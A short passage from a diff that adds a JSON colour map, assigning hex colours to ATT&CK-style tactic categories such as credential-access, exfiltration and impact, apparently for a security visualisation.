+      "defense-evasion": "#fd9644",
+      "credential-access": "#da77f2",
+      "discovery": "#e8884a",
+      "lateral-movement": "#20b2aa",
+      "collection": "#a0522d",
+      "command-and-control": "#ff6b6b",
+      "exfiltration": "#ff4757",
+      "impact": "#ff0000",
+      "none": "#888888"
+    },
+    "effect": {
+      "effect": "#6e48aa"
+    }
+  }
+}
